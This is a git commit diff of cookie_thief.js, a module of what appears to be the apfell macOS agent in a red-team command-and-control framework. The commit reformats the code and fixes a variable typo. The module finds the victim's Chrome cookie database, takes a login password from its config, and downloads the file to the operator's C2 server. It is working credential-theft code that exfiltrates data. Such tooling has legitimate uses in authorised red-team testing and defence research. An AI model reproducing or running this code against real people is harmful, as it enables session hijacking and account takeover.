f290b9bf65e2b78c1696ce17e976832d3bb3cfb1
Johnny Mnemonic <johnnymnemonic@Swarm.local>
2021-09-01 17:07:03 -0500

    debugging

--- Payload_Type/apfell/agent_code/cookie_thief.js
+++ Payload_Type/apfell/agent_code/cookie_thief.js
@@ -7,25 +7,29 @@ exports.cookie_thief = function(task, command, params){
     let chromeCookieDir = "Library/Application Support/Google/Chrome/Default/Cookies"
     let cookiedir = "Library/Application Support/Google/Chrome/Default/Cookies"
     if(params === "" || params === undefined)  {
-      return {'user_output': "Must supply a the user's login password", "completed": true, "status": "error"};
+        return {'user_output': "Must supply a the user's login password", "completed": true, "status": "error"};
     }
-    if(config.hasOwnProperty("password") && typeof config['password'] == 'string'){ password = config['password']; }
+
+    if(config.hasOwnProperty("password") && typeof config['password'] == 'string'){
+        password = config['password'];
+    }
+
     if(config.hasOwnProperty("username") && typeof config['username'] == 'string') {
-      username = config['username'];
-      homedir = homedir += username + "/";
+        username = config['username'];
+        homedir = homedir += username + "/";
     }
     else {
-      username = $.NSUserName();
+        username = $.NSUserName();
     }
-    if(config.hasOwnProperty("browser") && typeof config['browser'] == 'string'){ browswer = config['browser']; }
+    if(config.hasOwnProperty("browser") && typeof config['browser'] == 'string'){ browser = config['browser']; }
     if(browser == "chrome") {
-      cookiedir = chromeCookieDir;
+        cookiedir = chromeCookieDir;
     }
     cookieDLPath = homedir + cookiedir;
     try{
         let status = C2.download(task, cookieDLPath);
-    	if(status.hasOwnProperty("file_id")){
-    	    status['user_output'] = "Finished Downloading";
+    	  if(status.hasOwnProperty("file_id")){
+    	      status['user_output'] = "Finished Downloading";
         }
     	return status;
     }
